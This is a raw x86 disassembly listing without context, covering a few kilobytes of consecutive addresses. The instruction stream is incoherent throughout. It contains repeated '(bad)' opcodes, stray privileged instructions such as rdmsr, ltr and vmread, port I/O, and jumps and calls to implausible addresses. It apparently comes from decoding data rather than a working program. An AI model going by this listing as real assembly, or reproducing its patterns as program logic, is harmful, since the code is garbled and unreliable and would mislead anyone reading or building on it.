  4315a8:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4315ae:	add    BYTE PTR [ebp+0x35e90f50],al
  4315b4:	add    al,BYTE PTR [eax]
  4315b6:	add    BYTE PTR [ebx-0x38fe4f80],al
  4315bc:	add    ah,ch
  4315be:	or     BYTE PTR [ebp+0x4501f845],dh
  4315c4:	jmp    0xdf18ba
  4315c9:	(bad)  
  4315ca:	nop    ecx
  4315cd:	test   DWORD PTR [ebp+0x4502f8],eax
  4315d3:	xor    ecx,DWORD PTR [ebp-0x64]
  4315d6:	mov    eax,edi
  4315d8:	mov    ebx,DWORD PTR [eax+edx*2]
  4315db:	add    eax,0x45fef885
  4315e0:	dec    DWORD PTR [ebx+0x339445]
  4315e6:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4315ec:	dec    DWORD PTR [ebx-0x460f0375]
  4315f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4315f3:	add    esi,edi
  4315f5:	add    bh,bh
  4315f7:	rdpmc  
  4315f9:	add    BYTE PTR [ebx],0x1
  4315fc:	mov    DWORD PTR [eax],eax
  4315fe:	add    al,0x45
  431600:	dec    DWORD PTR [ecx-0x360b3373]
  431606:	dec    DWORD PTR [esi]
  431608:	push   eax
  431609:	jne    0x431650
  43160b:	mov    esi,DWORD PTR [ebx]
  43160d:	cld    
  43160e:	add    esp,ecx
  431610:	push   eax
  431611:	inc    DWORD PTR [ebp-0x75]
  431614:	add    eax,0x800e4
  431619:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43161f:	mov    DWORD PTR [ecx],eax
  431621:	sbb    al,0x0
  431623:	leave  
  431624:	test   DWORD PTR [edi-0x2],eax
  431627:	jne    0x431628
  431629:	call   0xff44002e
  43162e:	xor    BYTE PTR [ebp+0x4d],al
  431631:	mov    edi,edi
  431633:	enter  0x8,0x4d
  431637:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43163d:	mov    eax,DWORD PTR [eax]
  43163f:	cld    
  431640:	add    DWORD PTR [ecx],ebx
  431642:	inc    ebp
  431643:	dec    ebp
  431644:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43164a:	inc    eax
  43164b:	dec    DWORD PTR [ecx-0x270375]
  431651:	add    BYTE PTR [ebx-0x39d72701],cl
  431657:	xchg   ecx,eax
  431658:	ret    
  431659:	add    BYTE PTR [ebp-0x830075],al
  43165f:	add    BYTE PTR [ebp-0x75],al
  431662:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431668:	lea    edi,[edi-0xc]
  43166b:	add    bh,bh
  43166d:	mov    edx,DWORD PTR [eax-0x7b]
  431670:	inc    ebp
  431671:	rdpmc  
  431673:	jne    0x431678
  431675:	add    BYTE PTR [eax-0x75],dl
  431678:	inc    ebp
  431679:	clc    
  43167a:	add    eax,0x400009
  43167f:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431685:	mov    eax,DWORD PTR [ecx]
  431687:	in     al,dx
  431688:	add    dh,al
  43168a:	test   ebx,eax
  43168c:	inc    BYTE PTR [ebp-0xff0001]
  431692:	add    BYTE PTR [ebp-0x43],al
  431695:	cmp    esi,0xfffffff8
  431698:	(bad)  
  431699:	push   DWORD PTR [eax]
  43169b:	add    BYTE PTR [ebp-0x3a],dl
  43169e:	test   ebx,eax
  4316a0:	je     0x431627
  4316a2:	mov    edi,edi
  4316a4:	sbb    al,0xff
  4316a6:	test   DWORD PTR gs:[eax],eax
  4316a9:	(bad)  
  4316aa:	js     0x4316ab
  4316ac:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4316b2:	sub    eax,ebx
  4316b4:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4316ba:	add    eax,DWORD PTR [eax]
  4316bc:	dec    ebp
  4316bd:	push   eax
  4316be:	mov    al,BYTE PTR [ebp+0x1]
  4316c1:	mov    eax,DWORD PTR [ebp-0x68]
  4316c4:	mov    eax,DWORD PTR [eax]
  4316c6:	sbb    bh,al
  4316c8:	or     ah,dh
  4316ca:	dec    ebp
  4316cb:	inc    DWORD PTR [eax+0x4]
  4316ce:	push   ecx
  4316cf:	add    BYTE PTR [edx-0x1],dh
  4316d2:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4316d8:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4316e2:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4316e8:	push   ecx
  4316e9:	cmp    BYTE PTR [ebx],al
  4316eb:	inc    ebp
  4316ec:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4316f2:	(bad)  
  4316f3:	(bad)  
  4316f4:	in     al,0xff
  4316f6:	add    BYTE PTR [ebp+0x0],al
  4316f9:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4316ff:	add    al,bh
  431701:	(bad)  
  431702:	jmp    0x8d85:0x74b0558d
  431709:	dec    DWORD PTR [eax]
  43170b:	call   DWORD PTR [ebp-0x7b]
  43170e:	mov    edi,esi
  431710:	lock call DWORD PTR [ebp-0x75]
  431714:	mov    esi,esp
  431716:	mov    ah,0xc6
  431718:	mov    bh,0xc3
  43171a:	mov    DWORD PTR [ebx-0x110003c4],ecx
  431720:	add    DWORD PTR [eax],0x450050ff
  431726:	mov    DWORD PTR [ebx+0x9598cc],ecx
  43172c:	inc    edi
  43172e:	push   esp
  431730:	jmp    0xcd00:0x650481ff
  431737:	mov    DWORD PTR [ebx],esi
  431739:	clc    
  43173a:	cmp    edi,0xff9cff3c
  431740:	jne    0x43174a
  431742:	mov    eax,eax
  431744:	add    esi,DWORD PTR [eax]
  431746:	int3   
  431747:	inc    ebp
  431748:	cmp    al,0x83
  43174a:	add    BYTE PTR [eax],bl
  43174c:	adc    DWORD PTR [ebx+0x768b5055],eax
  431752:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431758:	mov    edi,eax
  43175a:	cmp    BYTE PTR [ebp+0x45],cl
  43175d:	jmp    0x4316ea
  43175f:	mov    ebx,DWORD PTR [esp+ebp*8]
  431762:	inc    ebp
  431763:	or     al,0x2
  431765:	dec    DWORD PTR [ebp+0x18]
  431768:	jne    0x4317bf
  43176a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  431770:	mov    edi,DWORD PTR [ebx]
  431772:	in     al,0x50
  431774:	xchg   ecx,eax
  431775:	jmp    0x343667a
  43177a:	adc    al,0x8b
  43177c:	inc    ebp
  43177d:	mov    al,ds:0x8b04008b
  431782:	push   ebp
  431783:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431789:	push   ebp
  43178a:	test   DWORD PTR [ebx-0x2800d701],ecx
  431790:	inc    ebp
  431791:	dec    ebp
  431792:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431798:	mov    DWORD PTR [eax],0xe9ff00f4
  43179e:	add    al,0x0
  4317a0:	add    BYTE PTR [eax],al
  4317a2:	mov    eax,edx
  4317a4:	push   eax
  4317a5:	rol    DWORD PTR [ebp-0xf0177],1
  4317ab:	bound  eax,QWORD PTR [ebp+0x50]
  4317ae:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4317b4:	add    BYTE PTR [ecx+0x558df0ff],cl
  4317ba:	mov    al,0xf
  4317bc:	test   DWORD PTR [edx],edx
  4317be:	call   DWORD PTR [ebp-0x7a0001]
  4317c4:	(bad)  
  4317c5:	loop   0x4317c6
  4317c7:	jnp    0xc6990bcd
  4317cd:	mov    eax,ebx
  4317cf:	cmp    al,0x8b
  4317d1:	(bad)  
  4317d2:	cld    
  4317d3:	shr    esi,0xc
  4317d6:	add    dl,al
  4317d8:	push   eax
  4317d9:	lea    eax,[ebp-0x1]
  4317dc:	mov    edx,esi
  4317de:	cwde   
  4317df:	cli    
  4317e0:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4317e6:	or     BYTE PTR [eax],cl
  4317e8:	inc    ebp
  4317e9:	dec    ebp
  4317ea:	inc    DWORD PTR [ebx+0x74803914]
  4317f0:	add    DWORD PTR [ebx+0x451800],ecx
  4317f6:	call   DWORD PTR [eax+edx*1]
  4317f9:	add    ecx,DWORD PTR [ebp-0x34]
  4317fc:	push   edi
  4317fd:	adc    al,0x8
  4317ff:	mov    edx,DWORD PTR [ebp-0x14]
  431802:	mov    ecx,DWORD PTR [ebp+0x18]
  431805:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431809:	inc    DWORD PTR [eax+esi*8]
  43180c:	inc    ebp
  43180d:	stos   BYTE PTR es:[edi],al
  43180e:	mov    edx,DWORD PTR [ebp-0x4]
  431811:	add    DWORD PTR [ebp-0x1c],eax
  431814:	mov    edx,DWORD PTR [ebp-0x70]
  431817:	cmp    eax,DWORD PTR [eax]
  431819:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43181a:	mov    eax,DWORD PTR [eax]
  43181c:	cld    
  43181d:	jae    0x43179f
  43181f:	add    eax,DWORD PTR [ecx]
  431821:	clc    
  431822:	add    BYTE PTR [eax+0x30],dl
  431825:	mov    DWORD PTR [ecx],esi
  431827:	clc    
  431828:	pop    ds
  431829:	inc    ebp
  43182a:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  431830:	(bad)  
  431831:	push   DWORD PTR [edi]
  431833:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431839:	(bad)  
  43183a:	jae    0x43183b
  43183c:	mov    eax,DWORD PTR [ebp-0x740175]
  431842:	sub    eax,DWORD PTR [eax]
  431844:	add    eax,DWORD PTR [eax]
  431846:	mov    DWORD PTR [ecx+0x5f],eax
  431849:	mov    DWORD PTR [ebx-0x4],ebx
  43184c:	ret    0xff
  43184f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431855:	ret    
  431856:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43185c:	add    BYTE PTR [ebp-0x7d],al
  43185f:	mov    DWORD PTR [eax],eax
  431861:	add    al,0x84
  431863:	inc    DWORD PTR [ecx]
  431865:	lea    eax,[eax]
  431867:	hlt    
  431868:	sar    bh,cl
  43186a:	test   BYTE PTR [eax+0x1],dl
  43186d:	inc    ebp
  43186e:	add    BYTE PTR [ebx],dh
  431870:	test   BYTE PTR [ebx],0x84
  431873:	push   eax
  431874:	add    BYTE PTR [ebp+0x0],al
  431877:	add    eax,0x86
  43187c:	add    BYTE PTR [ebx-0x7f7b0340],cl
  431882:	add    BYTE PTR [ecx],al
  431884:	add    BYTE PTR [eax],al
  431886:	mov    esi,0x550030
  43188b:	mov    ecx,DWORD PTR [edi]
  43188d:	cld    
  43188e:	fidiv  DWORD PTR [ebp+0x0]
  431891:	mov    edi,DWORD PTR [ecx]
  431893:	xor    BYTE PTR [eax+eax*1],0x84
  431897:	add    eax,DWORD PTR [eax]
  431899:	sbb    BYTE PTR [eax],al
  43189b:	jne    0x43184e
  43189d:	mov    eax,DWORD PTR [ecx]
  43189f:	sbb    BYTE PTR [eax],al
  4318a1:	mov    DWORD PTR [ebp-0x1],esp
  4318a4:	add    BYTE PTR [eax+0x30e45ca],bh
  4318aa:	ret    0xb7fc
  4318ad:	dec    ebp
  4318ae:	or     al,0x89
  4318b0:	dec    ebp
  4318b1:	cld    
  4318b2:	cmovne ecx,DWORD PTR [eax-0x75]
  4318b6:	add    edi,esp
  4318b8:	seto   BYTE PTR [esi-0x72ffffff]
  4318bf:	inc    ebp
  4318c0:	adc    al,0x8b
  4318c2:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4318c9:	cmp    DWORD PTR [edi+0x72],edx
  4318cc:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4318d2:	gs cmp al,0x0
  4318d5:	je     0x4318ad
  4318d7:	push   eax
  4318d8:	sar    BYTE PTR [eax],1
  4318da:	mov    bh,0x3e
  4318dc:	push   cs
  4318dd:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4318e3:	add    DWORD PTR [ecx+0x12],ebp
  4318e6:	dec    edx
  4318e7:	(bad)  
  4318e8:	mov    eax,edx
  4318ea:	in     al,dx
  4318eb:	adc    DWORD PTR [ecx],esi
  4318ed:	pop    esi
  4318ee:	inc    ecx
  4318ef:	leave  
  4318f0:	or     DWORD PTR [eax],ebx
  4318f2:	gs push ebp
  4318f4:	add    ah,ch
  4318f6:	into   
  4318f7:	in     al,dx
  4318f8:	enter  0xb756,0xf0
  4318fc:	push   cs
  4318fd:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431907:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  43190d:	jnp    0x74439e15
  431913:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431919:	add    BYTE PTR [edi],cl
  43191b:	mov    edi,DWORD PTR [ecx-0x78]
  43191e:	ltr    WORD PTR [ecx-0x7b]
  431922:	dec    DWORD PTR [edi]
  431924:	clc    
  431925:	out    0x45,eax
  431927:	add    BYTE PTR [eax],cl
  431929:	cmp    ebx,0xffffff8c
  43192c:	jge    0x43192e
  43192e:	jb     0x431940
  431930:	je     0x5219b0
  431936:	pop    edx
  431937:	push   esi
  431938:	mov    ecx,DWORD PTR [edi]
  43193a:	in     al,dx
  43193b:	rol    DWORD PTR [ebp+0x0],1
  43193e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431945:	cmp    DWORD PTR [ecx],0xfffffff0
  431948:	hlt    
  431949:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43194f:	(bad)  
  431951:	push   eax
  431952:	jns    0xb842fdd0
  431958:	lock push cs
  43195a:	ror    edx,0x3
  43195d:	test   BYTE PTR [ecx+0x5500e800],cl
  431963:	dec    eax
  431964:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431968:	(bad)  
  431969:	mov    esi,0x7f33ff5f
  43196e:	inc    eax
  43196f:	test   DWORD PTR [edx],eax
  431971:	je     0x431933
  431973:	mov    ecx,ecx
  431975:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431979:	and    eax,DWORD PTR [eax+0xf0103]
  43197f:	jp     0x43196d
  431981:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431985:	add    edx,DWORD PTR [edi+0x74]
  431988:	sbb    BYTE PTR [ebp+0x4d001484],cl
  43198e:	add    BYTE PTR [ebp-0x74c48bbb],al
  431994:	je     0x431919
  431996:	cmp    eax,edi
  431998:	js     0x4319bd
  43199a:	add    eax,0xeb0fc003
  43199f:	jns    0x43192c
  4319a1:	vmread DWORD PTR [ecx+0x45],ebx
  4319a5:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  4319ab:	adc    al,0x8b
  4319ad:	jge    0x4319c3
  4319af:	mov    edi,DWORD PTR [eax-0x4]
  4319b2:	add    edi,DWORD PTR [edi]
  4319b4:	or     bh,bh
  4319b6:	push   ebp
  4319b7:	push   es
  4319b8:	mov    DWORD PTR [ebp-0x4],ebx
  4319bb:	add    edi,esi
  4319bd:	pop    es
  4319be:	add    esi,DWORD PTR [edi-0x48ccf183]
  4319c4:	mov    DWORD PTR [esp+esi*8],ecx
  4319c7:	inc    ebp
  4319c8:	pop    ebp
  4319c9:	xor    DWORD PTR [esi-0x4],0x3b
  4319cd:	add    edx,DWORD PTR [ecx+edi*1]
  4319d0:	push   es
  4319d1:	clc    
  4319d2:	mov    bh,0xdb
  4319d4:	jp     0x43198d
  4319d6:	add    cl,BYTE PTR [esi]
  4319d8:	div    DWORD PTR [edi+0x4d8b0c1c]
  4319de:	test   edi,edi
  4319e0:	je     0x4319d6
  4319e2:	mov    eax,ecx
  4319e4:	or     BYTE PTR [ebx],al
  4319e6:	dec    BYTE PTR [ecx+0x7d3bec7d]
  4319ec:	jbe    0x431a60
  4319ee:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  4319f4:	add    ecx,DWORD PTR [esi]
  4319f6:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  4319fc:	add    eax,DWORD PTR [ebx-0x287af783]
  431a02:	je     0x431a51
  431a04:	mov    DWORD PTR [ecx],edi
  431a06:	mov    esi,eax
  431a08:	hlt    
  431a09:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431a10:	jb     0x4319d2
  431a12:	jmp    0x4319ff
  431a14:	xor    esi,DWORD PTR [ebx]
  431a16:	pop    edi
  431a17:	pop    esi
  431a18:	pop    ebx
  431a19:	ret    
  431a1a:	ret    0x8b
  431a1d:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431a23:	xor    DWORD PTR [ecx],0xc
  431a26:	pushf  
  431a27:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431a2d:	rdmsr  
  431a2f:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431a36:	dec    ebp
  431a37:	ret    
  431a38:	mov    edi,DWORD PTR [esi-0x4]
  431a3b:	pop    eax
  431a3c:	dec    ebp
  431a3d:	jne    0x4319ca
  431a3f:	xor    edi,esp
  431a41:	inc    eax
  431a42:	dec    ebp
  431a43:	jbe    0x431a98
  431a45:	inc    eax
  431a46:	pop    ebp
  431a47:	add    edx,DWORD PTR [esi+0x8]
  431a4a:	push   esp
  431a4b:	dec    eax
  431a4c:	push   ecx
  431a4d:	mov    eax,edi
  431a4f:	and    al,0xf0
  431a51:	jo     0x431a3e
  431a53:	mov    eax,DWORD PTR [ebx]
  431a55:	sbb    BYTE PTR [ebp+0x4d],cl
  431a58:	mov    eax,DWORD PTR [ebx]
  431a5a:	nop
  431a5b:	or     BYTE PTR [eax],al
  431a5d:	jne    0x431ab6
  431a5f:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431a65:	cld    
  431a66:	xor    edi,edi
  431a68:	add    edi,DWORD PTR [ebp+0x3]
  431a6b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431a71:	js     0x4319f7
  431a73:	jae    0x431a77
  431a75:	(bad)  
  431a77:	xor    al,0x5d
  431a79:	jmp    0x431a06
  431a7b:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431a82:	fdecstp 
  431a84:	test   BYTE PTR [edi],ah
  431a86:	add    bh,BYTE PTR [ebp+0x0]
  431a89:	add    ebx,DWORD PTR [ebp-0x77]
  431a8c:	mov    edi,eax
  431a8e:	cmp    al,0x0
  431a91:	adc    dh,BYTE PTR [ebx]
  431a93:	jge    0x431a98
  431a95:	mov    edi,DWORD PTR [ebx]
  431a97:	jl     0x431aa8
  431a99:	clc    
  431a9a:	dec    edi
  431a9b:	jge    0x431a9d
  431a9d:	mov    eax,DWORD PTR [ebx]
  431a9f:	jb     0x431aa9
  431aa1:	mov    ecx,DWORD PTR [ebp-0x8]
  431aa4:	mov    edi,edi
  431aa6:	xor    edx,DWORD PTR [eax]
  431aa8:	add    edi,DWORD PTR [ebx]
  431aaa:	mov    DWORD PTR [ebp-0x10],edi
  431aad:	inc    edi
  431aae:	pop    ebp
  431aaf:	jge    0x431aec
  431ab1:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431ab5:	mov    edx,0xc05d87f0
  431aba:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431abe:	fimul  WORD PTR [eax]
  431ac0:	fist   WORD PTR [ebp+0x1c]
  431ac3:	in     al,dx
  431ac4:	jne    0x431ab2
  431ac6:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431acc:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431ad0:	fdivp  st(0),st
  431ad2:	fild   WORD PTR [ebp+0x4510f85c]
  431ad8:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431ade:	inc    ebp
  431adf:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431ae5:	mov    ebp,DWORD PTR [ebx-0x4]
  431ae8:	adc    al,0x8b
  431aea:	rcl    DWORD PTR [eax],0x48
  431aed:	mov    esi,0x7080803
  431af2:	fiadd  WORD PTR [ebp+0x4d]
  431af5:	(bad)  
  431af6:	mov    edx,DWORD PTR [edx-0x4]
  431af9:	mov    edx,DWORD PTR [ebp-0x4]
  431afc:	xor    ebx,DWORD PTR [ebx+0x330103]
  431b02:	mov    DWORD PTR [edi+0x872dc],edi
  431b08:	xlat   BYTE PTR ds:[ebx]
  431b09:	into   
  431b0a:	ffreep st(6)
  431b0c:	retf   0x6c7
  431b0f:	iret   
  431b10:	dec    ebp
  431b11:	inc    ebp
  431b12:	mov    DWORD PTR [ebx],edi
  431b14:	fmul   QWORD PTR [edi]
  431b16:	dec    ebp
  431b17:	jnp    0x431b4c
  431b19:	add    BYTE PTR [ebx],al
  431b1b:	mov    ecx,DWORD PTR [esp+edi*8]
  431b1e:	inc    ebp
  431b1f:	dec    ebp
  431b20:	lea    esi,[ebx]
  431b22:	add    DWORD PTR [ebx],eax
  431b24:	jb     0x431b61
  431b26:	add    BYTE PTR [edi],cl
  431b28:	inc    ebp
  431b29:	imul   eax,edi,0x858bd800
  431b2f:	cld    
  431b30:	clc    
  431b31:	mov    DWORD PTR [ebp+0x0],eax
  431b34:	inc    DWORD PTR [eax]
  431b36:	or     al,0xde
  431b38:	sbb    bh,0x1
  431b3b:	retf   
  431b3c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431b43:	dec    ebp
  431b44:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431b4a:	enter  0x12de,0xdf
  431b4e:	inc    ebp
  431b4f:	pop    ebp
  431b50:	dec    DWORD PTR [ebx-0x257f0ff4]
  431b56:	add    DWORD PTR [edx],edx
  431b58:	add    BYTE PTR [ebp+0x50],dl
  431b5b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431b61:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431b67:	or     ah,al
  431b69:	pop    ss
  431b6a:	cdq    
  431b6b:	push   ebp
  431b6c:	clc    
  431b6d:	mov    eax,DWORD PTR [ebp-0x4]
  431b70:	xor    edx,edx
  431b72:	add    esi,DWORD PTR [ebx]
  431b74:	cmp    eax,DWORD PTR [ebx]
  431b76:	hlt    
  431b77:	cmp    DWORD PTR [ebx],esp
  431b79:	or     al,BYTE PTR [ebp+0xf]
  431b7c:	mov    eax,DWORD PTR [edx]
  431b7e:	loopne 0x431b80
  431b80:	(bad)  
  431b81:	mov    ecx,esi
  431b83:	cld    
  431b84:	pushf  
  431b85:	pop    ebp
  431b86:	fwait
  431b87:	mov    esi,DWORD PTR [edx]
  431b89:	lock mov eax,eax
  431b8c:	adc    BYTE PTR [ebx],al
  431b8e:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431b95:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431b9b:	dec    ebp
  431b9c:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431ba2:	(bad)  
  431ba3:	iret   
  431ba4:	inc    ebp
  431ba5:	(bad)  
  431ba6:	jne    0x431bf5
  431ba8:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431bae:	(bad)  
  431baf:	cmp    ebx,eax
  431bb1:	je     0x431b39
  431bb3:	add    edi,edi
  431bb5:	or     bh,bh
  431bb7:	dec    ebp
  431bb8:	inc    ebp
  431bb9:	mov    esi,DWORD PTR [ebx]
  431bbb:	cld    
  431bbc:	add    ecx,esi
  431bbe:	cmp    ecx,DWORD PTR [eax-0xc]
  431bc1:	mov    edx,DWORD PTR [edi]
  431bc3:	or     BYTE PTR [ebp-0x7c],al
  431bc6:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431bcc:	test   BYTE PTR [ebx+ebx*4],cl
  431bcf:	inc    ebp
  431bd0:	xor    bh,BYTE PTR [esi]
  431bd2:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431bd9:	jne    0x431ba2
  431bdb:	mov    ebp,esp
  431bdd:	fcomp  DWORD PTR [ebx]
  431bdf:	add    BYTE PTR [ecx],al
  431be1:	inc    DWORD PTR [ebp-0x75]
  431be4:	(bad)  
  431be5:	cld    
  431be6:	add    al,0xce
  431be8:	mov    ecx,edi
  431bea:	cld    
  431beb:	inc    ebp
  431bec:	fidivr WORD PTR [ebx]
  431bee:	fbstp  TBYTE PTR [ebp-0x3e]
  431bf1:	mov    eax,DWORD PTR [eax]
  431bf3:	adc    BYTE PTR [ebx-0x3974038b],cl
  431bf9:	fadd   st,st(7)
  431bfb:	add    BYTE PTR [ebp-0x1],al
  431bfe:	mov    ecx,DWORD PTR [esp+edi*8]
  431c01:	inc    ebp
  431c02:	mov    bh,0xc7
  431c05:	loopne 0x431c4c
  431c07:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431c0d:	sbb    dh,BYTE PTR [ebx]
  431c0f:	pushf  
  431c10:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431c16:	mov    eax,edi
  431c18:	cwde   
  431c19:	inc    ebp
  431c1a:	inc    ebp
  431c1b:	jne    0x431ba8
  431c1d:	mov    esp,esp
  431c1f:	clc    
  431c20:	add    al,0x4d
  431c22:	mov    DWORD PTR [ebx],esi
  431c24:	or     al,0x33
  431c26:	inc    ebp
  431c27:	lea    ecx,[ebx-0x398d13fd]
  431c2d:	add    bh,al
  431c2f:	inc    ebp
  431c30:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431c37:	add    ebp,esp
  431c39:	shufps xmm1,xmm3,0xc7
  431c3d:	(bad)  
  431c3e:	jmp    0x74885767
  431c43:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431c49:	hlt    
  431c4a:	mov    ecx,DWORD PTR [edi]
  431c4c:	fadd   DWORD PTR [ebp+0x0]
  431c4f:	xor    ecx,DWORD PTR [edi]
  431c51:	add    ecx,ecx
  431c53:	cmp    edi,edi
  431c55:	pmuludq mm7,QWORD PTR [edx+0x50]
  431c59:	(bad)  
  431c5a:	jmp    0x431be7
  431c5c:	mov    edi,esp
  431c5e:	or     al,0xc6
  431c60:	inc    ebp
  431c61:	(bad)  
  431c62:	mov    eax,DWORD PTR [ebp+0x10]
  431c65:	jne    0x431bf0
  431c67:	mov    eax,DWORD PTR [ecx]
  431c69:	clc    
  431c6a:	add    BYTE PTR [ebp-0x40],cl
  431c6d:	xor    edx,DWORD PTR [eax-0x73]
  431c70:	jne    0x431c73
  431c72:	push   DWORD PTR [edx+0x8]
  431c75:	add    BYTE PTR [ebp+0x45],al
  431c78:	mov    ebp,ecx
  431c7a:	cld    
  431c7b:	add    BYTE PTR [ebp+0x0],cl
  431c7e:	xor    eax,DWORD PTR [ebp+0x3]
  431c81:	mov    DWORD PTR [ebx],edi
  431c83:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431c89:	sub    eax,0x5d330e4d
  431c8e:	lea    esi,[ebx]
  431c90:	add    DWORD PTR [ebx],eax
  431c92:	jb     0x431c7d
  431c94:	add    BYTE PTR [eax],al
  431c96:	inc    ebp
  431c97:	add    bl,ch
  431c99:	inc    ebp
  431c9a:	mov    esi,DWORD PTR [ebx]
  431c9c:	or     al,0x3
  431c9e:	(bad)  
  431c9f:	mov    edi,eax
  431ca1:	in     al,dx
  431ca2:	scas   eax,DWORD PTR es:[edi]
  431ca3:	inc    ebp
  431ca4:	mov    esi,DWORD PTR [ebx]
  431ca6:	in     al,0x3
  431ca8:	add    al,0x89
  431caa:	mov    ecx,DWORD PTR [eax+edi*8]
  431cad:	dec    ebp
  431cae:	(bad)  
  431caf:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431cb6:	mov    ecx,eax
  431cb8:	cld    
  431cb9:	push   es
  431cba:	dec    ebp
  431cbb:	add    al,0x33
  431cbd:	mov    DWORD PTR [ebx],eax
  431cbf:	in     al,dx
  431cc0:	cmp    DWORD PTR [ebp-0x67],eax
  431cc3:	mov    eax,DWORD PTR [ebp-0xba0068]
  431cc9:	mov    edx,DWORD PTR [ebp-0x4]
  431ccc:	mov    ecx,DWORD PTR [ebp-0x2c]
  431ccf:	xor    eax,DWORD PTR [ebp+0x3]
  431cd2:	cmp    DWORD PTR [ebx],0x8b32749a
  431cd8:	xor    edi,esp
  431cda:	jmp    0xff771a2c
  431cdf:	add    ecx,DWORD PTR [ebp-0x3f]
  431ce2:	xor    ebx,DWORD PTR [edi]
  431ce4:	add    eax,ecx
  431ce6:	cmp    ebx,DWORD PTR [eax]
  431ce8:	mov    ecx,DWORD PTR [ebp-0x4]
  431ceb:	mov    ecx,DWORD PTR [eax]
  431ced:	adc    BYTE PTR [ebp-0x80],al
  431cf0:	jmp    0x431cf3
  431cf2:	mov    eax,DWORD PTR [eax]
  431cf4:	cld    
  431cf5:	mov    bh,0xc6
  431cf7:	push   ecx
  431cf8:	(bad)  
  431cf9:	jne    0x431d59
  431cfb:	dec    ecx
  431cfd:	or     BYTE PTR [ecx+ebx*1],cl
  431d00:	push   ebp
  431d01:	inc    ebp
  431d02:	in     al,dx
  431d03:	add    ebp,esp
  431d05:	or     bh,al
  431d07:	dec    ebp
  431d08:	cld    
  431d09:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431d0f:	xor    DWORD PTR [edx],0x2
  431d12:	pushf  
  431d13:	dec    DWORD PTR [ebx+0x45510cf4]
  431d19:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431d1f:	mov    edx,DWORD PTR [ecx+0xc]
  431d22:	xor    eax,esi
  431d24:	mov    edx,0xc172c7
  431d29:	inc    ebp
  431d2a:	mov    esi,DWORD PTR [ebp+0x8]
  431d2d:	mov    eax,edx
  431d2f:	call   0x84c7e424
  431d34:	add    DWORD PTR [ebx-0x76bace00],ebx
  431d3a:	mov    ebp,eax
  431d3c:	or     BYTE PTR [eax],dl
  431d3e:	jo     0x431d8d
  431d40:	push   edi
  431d41:	xor    esi,DWORD PTR [ebp+0x3]
  431d44:	(bad)  
  431d45:	pmulhuw mm0,mm1
  431d48:	test   DWORD PTR [ebp-0x8],ecx
  431d4b:	mov    DWORD PTR [ebp-0x67],eax
  431d4e:	mov    eax,DWORD PTR [ebp-0x4]
